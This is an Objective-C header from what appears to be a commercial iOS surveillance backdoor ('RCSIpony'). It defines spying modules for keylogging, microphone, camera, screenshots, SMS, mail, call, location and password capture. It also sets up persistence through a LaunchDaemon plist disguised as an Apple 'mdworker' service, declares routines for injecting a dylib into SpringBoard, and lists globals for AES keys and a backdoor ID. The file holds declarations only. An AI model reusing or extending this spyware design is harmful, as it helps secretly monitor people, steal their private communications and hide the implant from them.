/*
 * RCSIpony - RCSICommon Header
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

//#ifndef __Common_h__
//#define __Common_h__

//#import "RCSISharedMemory.h"
#import <Foundation/Foundation.h>

#include <assert.h>  
#include <errno.h>  
#include <stdbool.h>  
#include <sys/sysctl.h>

#import <sqlite3.h>

#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <ifaddrs.h>

//#define DEBUG_LOG
//#define DEV_MODE

#define ME __func__

// enable core demo: background and sound on startup
//#define CORE_DEMO

//
// Protocol definition for all the agents, they must conform to this
//
@protocol Agents

- (void)start;
- (BOOL)stop;
- (BOOL)resume;

@end

typedef struct kinfo_proc kinfo_proc;

//RCSISharedMemory *sharedMemory;

#pragma mark -
#pragma mark Code Not Used
#pragma mark -

#define invokeSupersequent(...) \
    ([self getImplementationOf:_cmd after:impOfCallingMethod(self, _cmd)]) \
    (self, _cmd, ##__VA_ARGS__)

#define invokeSupersequentNoParameters() \
    ([self getImplementationOf:_cmd after:impOfCallingMethod(self, _cmd)]) \
    (self, _cmd)

#pragma mark -
#pragma mark General Parameters
#pragma mark -

#define BACKDOOR_DAEMON_PLIST @"/Library/LaunchDaemons/com.apple.mdworker.plist"
#define SLI_PLIST @"/Library/Preferences/com.apple.SystemLoginItems.plist"
 
#define LOG_PREFIX    @"LOGF"
#define LOG_EXTENSION @".log"

#define SH_COMMAND_FILENAME @"5u4ifj"
#define SH_LOG_FILENAME     @"78shfu"

#define SSL_FIRST_COMMAND @".NEWPROTO"
#define RCS8_MIGRATION_CONFIG @"nc-7-8dv.cfg"
#define RCS8_UPDATE_DYLIB     @"od-8-8dv.dlb"

// unixEpoch - winEpoch stuff
#define EPOCH_DIFF 0x019DB1DED53E8000LL /* 116444736000000000 nsecs */
#define RATE_DIFF  10000000             /* 100 nsecs */

// Max size of the exchanged app name through SHMem
#define MAXIDENTIFIERLENGTH 22

// Max seconds to wait for an agent/event stop
#define MAX_WAIT_TIME 5

// Encryption key length
#define KEY_LEN 128

// Size of the first 2 DWORDs that we need to skip in the configuration file
#define TIMESTAMP_SIZE sizeof(int) * 2

#define SHMEM_COMMAND_MAX_SIZE  0x4040
// Now is a mult of sizeof(shMemLog) == 10016d
#define SHMEM_LOG_MAX_SIZE      0x302460

// Hooked external apps Identifier
#define SPRINGBOARD   @"com.apple.springboard"
#define NEWCONF       @"new_juice.mac"
#define DELIMETER     0xABADC0DE

#pragma mark -
#pragma mark Backdoor Configuration
#pragma mark -

//
// Agents
//
#define AGENT_MESSAGES    0x1001
#define AGENT_ORGANIZER   0x1002 // per rcs 8.0: agent addressbook
#define AGENT_CALL_LIST   0x1003
#define AGENT_DEVICE      0x1004
#define AGENT_POSITION    0x1005
#define AGENT_CALL_DIVERT 0x1006
#define AGENT_CALL_VOICE  0x1007
#define AGENT_KEYLOG      0x1008
#define AGENT_SCREENSHOT  0x1009
#define AGENT_URL         0x100A
#define AGENT_IM          0x100B
#define AGENT_MICROPHONE  0x100D
#define AGENT_CAM         0x100E
#define AGENT_CLIPBOARD   0x100F
#define AGENT_CRISIS      0x1010
#define AGENT_APPLICATION 0x1011
#define AGENT_ADDRESSBOOK 0x1012 // per rcs 8.0

//
// Agents Shared Memory offsets
//
#define OFFT_KEYLOG       0x0040
#define OFFT_VOICECALL    0x0440
#define OFFT_SKYPE        0x0840
#define OFFT_URL          0x0C40
#define OFFT_MOUSE        0x1040
#define OFFT_MICROPHONE   0x1440
#define OFFT_IM           0x1840
#define OFFT_CLIPBOARD    0x1C40
#define OFFT_SCREENSHOT   0x2040
#define OFFT_UNINSTALL    0x2440
#define OFFT_APPLICATION  0x2840
#define OFFT_STANDBY      0x2C40
#define OFFT_SIMCHG       0x3040

extern u_int remoteAgents[];

//
// Events
//
#define EVENT_TIMER       0x2001
#define EVENT_SMS         0x2002
#define EVENT_CALL        0x2003
#define EVENT_CONNECTION  0x2004
#define EVENT_PROCESS     0x2005
#define EVENT_CELLID      0x2006
#define EVENT_QUOTA       0x2007
#define EVENT_SIM_CHANGE  0x2008
#define EVENT_LOCATION    0x2009
#define EVENT_AC          0x200A
#define EVENT_BATTERY     0x200B
#define EVENT_STANDBY     0x200C
#define EVENT_NULL        0xFFFF
// internal events
#define EVENT_CAMERA_APP  0xB000

// NEW - TODO
//#define EVENT_LOCKSCREEN  (uint)0x000x

//
// Actions
//
#define ACTION_SYNC         0x4001
#define ACTION_UNINSTALL    0x4002
#define ACTION_RELOAD       0x4003
#define ACTION_SMS          0x4004
#define ACTION_TOOTHING     0x4005
#define ACTION_AGENT_START  0x4006
#define ACTION_AGENT_STOP   0x4007
#define ACTION_SYNC_PDA     0x0008
#define ACTION_SYNC_APN     0x400a
#define ACTION_INFO         0x400b
#define ACTION_COMMAND      0x400c
#define ACTION_EVENT        0x400d

// Configuration file Tags
#define EVENT_CONF_DELIMITER  "EVENTCONFS-"
#define AGENT_CONF_DELIMITER  "AGENTCONFS-"
#define MOBILE_CONF_DELIMITER "MOBILCONFS-"
#define LOGRP_CONF_DELIMITER  "LOGRPCONFS-"
#define BYPAS_CONF_DELIMITER  "BYPASCONFS-"
#define ENDOF_CONF_DELIMITER  "ENDOFCONFS-"

// Agent Status
#define AGENT_DISABLED    @"DISABLED"
#define AGENT_ENABLED     @"ENABLED"
#define AGENT_RUNNING     @"RUNNING"
#define AGENT_STOPPED     @"STOPPED"
#define AGENT_SUSPENDED   @"SUSPENDED"
#define AGENT_RESTART     @"RESTART"

// Monitor Status
#define EVENT_RUNNING     @"RUNNING"
#define EVENT_STOPPED     @"STOPPED"

// Agent Commands
#define AGENT_START       @"START"
#define AGENT_STOP        @"STOP"
#define AGENT_RELOAD      @"RELOAD"

// Monitor Commands
#define EVENT_START       @"START"
#define EVENT_STOP        @"STOP"

#pragma mark -
#pragma mark Events/Actions/Agents Parameters
#pragma mark -

// Agents configuration
#define CONF_ACTION_NULL        0xFFFFFFFF

#define TIMER_AFTER_STARTUP     0x0
#define TIMER_LOOP              0x1
#define TIMER_DATE              0x2
#define TIMER_INST              0x3
#define TIMER_DAILY             0x4

#define CONNECTION_WIFI         0x1
#define CONNECTION_GPRS         0x2

#define FORCE_CONNECTION        0x2

#pragma mark -
#pragma mark Log Types
#pragma mark -

#define LOG_UNKNOWN         0xFFFF	// error
#define LOG_DOWNLOAD        0xD0D0
#define LOG_FILEOPEN        0x0000
#define LOG_FILECAPTURE     0x0001
#define LOG_KEYLOG          0x0040
#define LOG_PRINT           0x0100
#define LOG_SNAPSHOT        0xB9B9
#define LOG_UPLOAD          0xD1D1
#define LOG_DOWNLOAD        0xD0D0
#define LOG_CALL            0x0140
#define LOG_CALL_SKYPE      0x0141
#define LOG_CALL_GTALK      0x0142
#define LOG_CALL_YMSG       0x0143
#define LOG_CALL_MSN        0x0144
#define LOG_CALL_MOBILE     0x0145
#define LOG_URL             0x0180
#define LOG_CLIPBOARD       0xD9D9
#define LOG_PASSWORD        0xFAFA
#define LOG_MICROPHONE      0xC2C2
#define LOG_CHAT            0xC6C6
#define LOG_CAMERA          0xE9E9
#define LOG_APPLICATION     0x1011
#define LOG_FILESYSTEM      0xEDA1

// Only for iPhone
#define LOG_ADDRESSBOOK     0x0250

#define LOG_CALENDAR        0x0201
#define LOG_TASK            0x0202
#define LOG_MAIL            0x0210
#define LOG_SMS             0x0211
#define LOG_MMS             0x0212
#define LOG_LOCATION        0x0220
#define LOG_CALL_LIST       0x0230
#define LOG_DEVICE          0x0240
#define LOG_INFO            0x0241
#define LOG_MAGIC_CALLTYPE  0x26

typedef struct _standByStruct {
  UInt32 actionOnLock;
  UInt32 actionOnUnlock;
} standByStruct;

typedef struct _messagePrefix {
  unsigned size:24;
  unsigned type:8;
} messagePrefix;

typedef struct _messageDateTime {
  u_int lwDateTime;
  u_int hiDateTime;
} messageDateTime;

typedef struct _messageFilterHeader {
#define FILTER_CONF_V1_0            0x20
#define MAPI_STRING_CLASS           0x02
#define CLASS_SMS                   @"IPM.SMSText*"
#define CLASS_MAIL                  @"IPM.Note*"
#define CLASS_MMS                   @"IPM.MMS*"
#define COLLECT_FILTER_TYPE         0x01
#define REALTTIME_FILTER_TYPE       0x00
#define MAPIAGENTCONF_CLASSNAMELEN  32
#define FILTER_CLASS_V1_0           0x40
  messagePrefix prfx;                                // length of struct only
  u_int size;
  u_int version;  
  u_int type;                                        //COLLECT_FILTER_TYPE | REALTTIME_FILTER_TYPE
  char  messageClass[MAPIAGENTCONF_CLASSNAMELEN*2];  // Message class, may use "*" wildcard
  u_int enabled;                                     // FALSE for disabled or non configured classes, otherwise TRUE (if present in conf = always enabled)
  u_int all;                                         // take all messages of this class
  u_int doFilterFromDate;                            // get messages delivered past this date
  messageDateTime fromDate;                 
  u_int doFilterToDate;                              // get messages delivered to this date
  messageDateTime toDate;                   
  u_int  maxMessageSize;                              // filter by message size, 0 means do not filter by size
  u_int  maxMessageBytesToLog;                        // get only this max bytes for each message, 0 means take whole message
} filterHeader;

typedef struct _filterKeyWord {
#define FILTER_KEYWORDS 0x01 
  messagePrefix prfx;                                // length of key string
  char          key[1];
} filterKeyWord;

typedef struct _messageFilter {

#define CONFIGURATION_FILTER 0x02 
  messagePrefix prfx;                                 // total length of struct [filterKeyWord arrary lenght]
  filterHeader  fltHeader; 
  filterKeyWord keyword;                              // zero or more keyWord struct
} filter;

typedef struct _message {
#define CONFIGURATION_TAG 0x01
  messagePrefix prfx;
  char   tagString[32]; 
  filter fltr;                                        // zero or more filter struct
} messageStruct;

#pragma mark -
#pragma mark Agents Data Struct Definition
#pragma mark -

#define LOGTYPE_DEVICE          0x0240 // Device info Agent

typedef struct _device
{
#define LOGTYPE_DEVICE_HW   0
#define LOGTYPE_DEVICE_PROC 1
  UInt32 iType;
#define AGENT_DEV_ENABLED     1
#define AGENT_DEV_NOTENABLED  0
  UInt32 isEnabled;
} deviceStruct;

//typedef struct _logDownload {
  //u_int version;
//#define LOG_FILE_VERSION 2008122901
  //u_int fileNameLength;
//} logDownloadAgentStruct;

//typedef struct _voiceCall {
  //u_int bufferSize;
  //u_int compression;
//} voiceCallAgentStruct;

//typedef struct _sms {
  //u_int mode;             // Collect (?) - RealTime (?) - Both (?)
//} smsAgentStruct;

//typedef struct _voipAdditionalHeader {
  //u_int version;
//#define LOG_VOIP_VERSION 2008121901
  //u_int channel;            // 0 Mic - 1 Speaker
//#define CHANNEL_MICROPHONE 0
//#define CHANNEL_SPEAKERS   1
  //u_int programType;        // VOIP_SKYPE
//#define VOIP_SKYPE 1
//#define VOIP_GTALK 2
//#define VOIP_YAHOO 3
//#define VOIP_MSMSG 4
//#define VOIP_MOBIL 5
//#define VOIP_SKWSA 6
  //u_int sampleRate;
  //u_int isIngoing;          // Not used as of now (0)
  //u_int loStartTimestamp;
  //u_int hiStartTimestamp;
  //u_int loStopTimestamp;
  //u_int hiStopTimestamp;
  //u_int localPeerLength;    // Not used as of now (0)
  //u_int remotePeerLength;   // Remote peer name length followed by the string
//} voipAdditionalStruct;

#define SAMPLE_RATE_DEFAULT 48000
#define SAMPLE_RATE_SKYPE   48000
#define SAMPLE_RATE_GTALK   48000
#define SAMPLE_RATE_YMSG    48000
#define SAMPLE_RATE_MSN     16000

#pragma mark -
#pragma mark Shared Memory communication protocol
#pragma mark -

// Component ID - aka who is reading from Shared Memory
// Component ID - aka who is reading from Shared Memory
#define COMP_CORE       0x0
#define COMP_AGENT      0x1
#define COMP_EXT_CALLB  0x2

typedef struct _shMemoryCommand {
  long  agentID;              // agentID
  u_int direction;            // 0 - FromAgentToCore | 1 - FromCoreToAgent
#define D_TO_CORE             0x0
#define D_TO_AGENT            0x1
  u_int command;              // 0 - LogData | 1 - StartAgent | 2 - StopAgent
#define AG_LOGDATA            0x0
#define AG_START              0x1
#define AG_STOP               0x2
#define AG_UNINSTALL          0x3
  u_int commandDataSize;
    char commandData[0x3F0];
} shMemoryCommand;

typedef struct _shMemoryLog {
  u_int status;                       // 0 - free | 1 - Is Writing | 2 - Written
#define SHMEM_FREE                0x0
#define SHMEM_LOCKED              0x1
#define SHMEM_WRITTEN             0x2
  long  logID;
  u_int agentID;                      // agentID
  u_int direction;                    // 0 - FromAgentToCore | 1 - FromCoreToAgent
  u_int commandType;
#define CM_NO_COMMAND             0x00000000
#define CM_CREATE_LOG_HEADER      0x00000001
#define CM_UPDATE_LOG_HEADER      0x00000002
#define CM_AGENT_CONF             0x00000004
#define CM_LOG_DATA               0x00000008
#define CM_CLOSE_LOG              0x00000010
#define CM_CLOSE_LOG_WITH_HEADER  0x00000020
  int64_t   timestamp;        // timestamp used for ordering
  u_int     flag;             // Per-Agent flag
  u_int     commandDataSize;  // Size of the command Data
#define MAX_COMMAND_DATA_SIZE 0x26fc  // old value = 980, now = 9980
  char  commandData[MAX_COMMAND_DATA_SIZE];
} shMemoryLog;

//
// Global variables required by the backdoor
//
extern char     gLogAesKey[];
extern char     gConfAesKey[];
extern char     gInstanceId[];
extern char     gBackdoorID[];
extern char     gBackdoorSignature[];
extern char     gConfName[];
extern char     gDemoMarker[];
extern u_int    gVersion;
extern FILE     *logFD;
extern NSString *gDylibName;
extern NSString *gBackdoorName;
extern NSString *gBackdoorUpdateName;
extern NSString *gConfigurationName;
extern NSString *gConfigurationUpdateName;
extern BOOL     gAgentCrisis;
extern NSData   *gSessionKey;
extern BOOL     gCameraActive;
extern int      gLockSock;
extern BOOL     gIsDemoMode;

// OS version
extern u_int gOSMajor;
extern u_int gOSMinor;
extern u_int gOSBugFix;

enum
{
  kErrorUnknown = -1,
};

#pragma mark -
#pragma mark Methods definition
#pragma mark -
#pragma mark Process routines

int getBSDProcessList       (kinfo_proc **procList, size_t *procCount);
NSArray *obtainProcessList  ();
BOOL findProcessWithName    (NSString *aProcess);

#pragma mark -
#pragma mark Unused

IMP impOfCallingMethod (id lookupObject, SEL selector);

#pragma mark -
#pragma mark Networking routines

BOOL isAddressOnLan (struct in_addr firstIp,
                     struct in_addr secondIp);
BOOL isAddressAlreadyDetected (NSString *ipAddress,
                               int aPort,
                               NSString *netMask,
                               NSMutableArray *ipDetectedList);
BOOL compareIpAddress (struct in_addr firstIp,
                       struct in_addr secondIp,
                       u_long netMask);

NSString *getHostname ();

#pragma mark -
#pragma mark General Purpose routines
#pragma mark -

NSString *getSystemSerialNumber ();

int matchPattern (const char *source, const char *pattern);
NSArray *searchForProtoUpload (NSString *aFileMask);
NSArray *searchFile (NSString *aFileMask);

id rcsPropertyWithName(NSString *name);
BOOL setRcsPropertyWithName(NSString *name, NSDictionary *dictionary);
BOOL injectDylib(NSString *sbPathname);

#ifdef __cplusplus
extern "C" { BOOL removeDylib(NSString *sbPathname); }
#else
BOOL removeDylib(NSString *sbPathname);
#endif

void getSystemVersion(u_int *major,
                      u_int *minor,
                      u_int *bugFix);

NSMutableArray *
rcs_sqlite_do_select(sqlite3 *db, const char *stmt);

#ifdef __cplusplus
  extern "C" {void checkAndRunDemoMode(void);}
#else
  void checkAndRunDemoMode(void);
#endif

//#endif
